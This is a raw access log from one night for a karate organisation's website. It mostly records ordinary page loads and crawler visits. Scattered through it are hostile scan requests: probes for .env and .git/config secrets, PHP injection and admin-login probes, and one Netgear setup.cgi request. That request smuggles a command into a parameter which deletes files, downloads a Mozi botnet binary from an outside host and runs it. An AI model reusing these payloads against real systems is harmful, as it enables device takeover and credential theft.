::ffff:185.254.196.115 - - [22/Jul/2022:00:02:30 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [22/Jul/2022:00:02:31 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:173.252.95.23 - - [22/Jul/2022:00:07:01 +0000] "GET /images/karatebook.jpg HTTP/1.1" 404 160 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
::ffff:114.119.152.108 - - [22/Jul/2022:00:11:22 +0000] "GET /index2.php/docs/docs/docs/index.php HTTP/1.1" 404 174 "http://www.wadokikai.org/index2.php/docs/docs/docs/Bushido-code.pdf" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:114.119.145.192 - - [22/Jul/2022:00:13:19 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "http://34.212.47.6/schools" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:135.125.246.189 - - [22/Jul/2022:00:16:03 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [22/Jul/2022:00:16:03 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.7.214.104 - - [22/Jul/2022:00:16:12 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:207.46.13.117 - - [22/Jul/2022:00:17:14 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:208.67.104.94 - - [22/Jul/2022:00:21:31 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:45 +0000] "GET / HTTP/1.1" 200 57618 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:46 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:46 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:46 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:46 +0000] "GET /images/marin5thDan.jpeg HTTP/1.1" 200 105451 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:46 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:46 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:46 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:46 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:46 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:46 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:46 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:46 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:46 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:46 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:46 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:46 +0000] "GET /images/tournaments/NKDTournament.pdf HTTP/1.1" 200 3770165 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:46 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:50 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:28:53 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:29:04 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:29:14 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:29:25 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 404 167 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:29:32 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:29:32 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://wadokikai.org/contact?s=1&ss=0" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:29:32 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://wadokikai.org/contact?s=1&ss=0" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:99.92.93.80 - - [22/Jul/2022:00:29:32 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://wadokikai.org/contact?s=1&ss=0" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:156.146.36.107 - - [22/Jul/2022:00:35:52 +0000] "GET /contact.html HTTP/1.1" 404 151 "-" "Mozilla/5.0 (X11; Linux i686 (x86_64)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.0 Safari/537.36"
::ffff:66.249.66.63 - - [22/Jul/2022:00:36:42 +0000] "GET /index.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:167.94.138.45 - - [22/Jul/2022:00:48:38 +0000] "GET / HTTP/1.1" 200 57618 "-" "-"
::ffff:167.94.138.45 - - [22/Jul/2022:00:48:38 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.138.45 - - [22/Jul/2022:00:48:39 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:114.119.152.108 - - [22/Jul/2022:01:02:29 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:114.119.152.12 - - [22/Jul/2022:01:08:50 +0000] "GET /instructors.html HTTP/1.1" 404 155 "http://www.wadokikai.org/overview.html" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:114.119.145.19 - - [22/Jul/2022:01:20:15 +0000] "GET /photos HTTP/1.1" 404 145 "http://34.212.47.6/schoolsandschedules" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:66.249.66.195 - - [22/Jul/2022:01:21:42 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.31 - - [22/Jul/2022:01:21:43 +0000] "GET /index.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:185.254.196.115 - - [22/Jul/2022:01:29:47 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [22/Jul/2022:01:29:48 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:124.162.128.4 - - [22/Jul/2022:01:32:19 +0000] "HEAD / HTTP/1.1" 200 57618 "-" "-"
::ffff:124.162.128.4 - - [22/Jul/2022:01:32:20 +0000] "GET / HTTP/1.1" - - "-" "-"
::ffff:185.7.214.104 - - [22/Jul/2022:01:44:39 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:24.13.38.142 - - [22/Jul/2022:01:47:12 +0000] "GET / HTTP/1.1" 200 57618 "https://www.bing.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49"
::ffff:24.13.38.142 - - [22/Jul/2022:01:47:12 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49"
::ffff:24.13.38.142 - - [22/Jul/2022:01:47:12 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49"
::ffff:24.13.38.142 - - [22/Jul/2022:01:47:12 +0000] "GET /images/marin5thDan.jpeg HTTP/1.1" 200 105451 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49"
::ffff:24.13.38.142 - - [22/Jul/2022:01:47:12 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49"
::ffff:24.13.38.142 - - [22/Jul/2022:01:47:12 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49"
::ffff:24.13.38.142 - - [22/Jul/2022:01:47:12 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49"
::ffff:24.13.38.142 - - [22/Jul/2022:01:47:12 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49"
::ffff:24.13.38.142 - - [22/Jul/2022:01:47:12 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49"
::ffff:24.13.38.142 - - [22/Jul/2022:01:47:12 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49"
::ffff:24.13.38.142 - - [22/Jul/2022:01:47:12 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49"
::ffff:24.13.38.142 - - [22/Jul/2022:01:47:12 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49"
::ffff:24.13.38.142 - - [22/Jul/2022:01:47:13 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49"
::ffff:24.13.38.142 - - [22/Jul/2022:01:47:13 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49"
::ffff:24.13.38.142 - - [22/Jul/2022:01:47:13 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49"
::ffff:24.13.38.142 - - [22/Jul/2022:01:47:13 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49"
::ffff:24.13.38.142 - - [22/Jul/2022:01:47:13 +0000] "GET /images/tournaments/NKDTournament.pdf HTTP/1.1" 200 3770165 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49"
::ffff:24.13.38.142 - - [22/Jul/2022:01:47:13 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49"
::ffff:24.13.38.142 - - [22/Jul/2022:01:47:16 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49"
::ffff:135.125.246.189 - - [22/Jul/2022:01:50:04 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [22/Jul/2022:01:50:04 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:192.241.216.12 - - [22/Jul/2022:02:23:30 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:185.7.214.104 - - [22/Jul/2022:02:30:08 +0000] "GET /console/ HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:114.119.151.9 - - [22/Jul/2022:02:34:29 +0000] "GET /index2.php/docs/index.php HTTP/1.1" 404 164 "http://www.wadokikai.org/index2.php/docs/Bushido-code.pdf" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:198.235.24.11 - - [22/Jul/2022:02:36:28 +0000] "GET / HTTP/1.1" 200 57618 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:103.216.223.166 - - [22/Jul/2022:02:37:32 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:186.155.227.234 - - [22/Jul/2022:02:38:35 +0000] "GET /CFIDE/administrator/ HTTP/1.1" 404 159 "-" "-"
::ffff:188.235.136.9 - - [22/Jul/2022:02:45:44 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::ffff:207.46.13.117 - - [22/Jul/2022:02:46:16 +0000] "GET /images/tm.jpg HTTP/1.1" 200 25020 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.182 - - [22/Jul/2022:02:51:02 +0000] "GET /images/jorge2020.jpg HTTP/1.1" 404 159 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:114.119.145.192 - - [22/Jul/2022:02:54:57 +0000] "GET /contact HTTP/1.1" 200 10017 "http://34.212.47.6/contact?s=1&ss=2" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:163.123.143.71 - - [22/Jul/2022:02:56:30 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:185.7.214.104 - - [22/Jul/2022:02:57:48 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:207.46.13.235 - - [22/Jul/2022:03:00:15 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.46 - - [22/Jul/2022:03:00:26 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.254.196.115 - - [22/Jul/2022:03:02:11 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [22/Jul/2022:03:02:12 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.109.3.204 - - [22/Jul/2022:03:17:45 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:130.211.54.158 - - [22/Jul/2022:03:19:41 +0000] "GET / HTTP/1.1" 200 57618 "-" "python-requests/2.28.1"
::ffff:27.40.101.92 - - [22/Jul/2022:03:21:50 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.40.101.92:54829/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:135.125.246.189 - - [22/Jul/2022:03:24:28 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [22/Jul/2022:03:24:28 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.149.52 - - [22/Jul/2022:03:33:12 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.19 - - [22/Jul/2022:03:33:13 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:194.37.98.102 - - [22/Jul/2022:03:42:49 +0000] "GET http://dyn.epicgifs.net/test6956.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
::ffff:163.123.143.71 - - [22/Jul/2022:03:44:23 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:185.7.214.104 - - [22/Jul/2022:03:59:29 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 165 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:165.227.208.131 - - [22/Jul/2022:04:09:06 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:185.7.214.104 - - [22/Jul/2022:04:12:54 +0000] "GET / HTTP/1.1" 200 57618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:185.189.182.234 - - [22/Jul/2022:04:15:55 +0000] "GET / HTTP/1.1" 200 57618 "-" "-"
::ffff:66.249.66.63 - - [22/Jul/2022:04:16:32 +0000] "GET /locations.php HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:185.254.196.115 - - [22/Jul/2022:04:29:50 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [22/Jul/2022:04:29:51 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
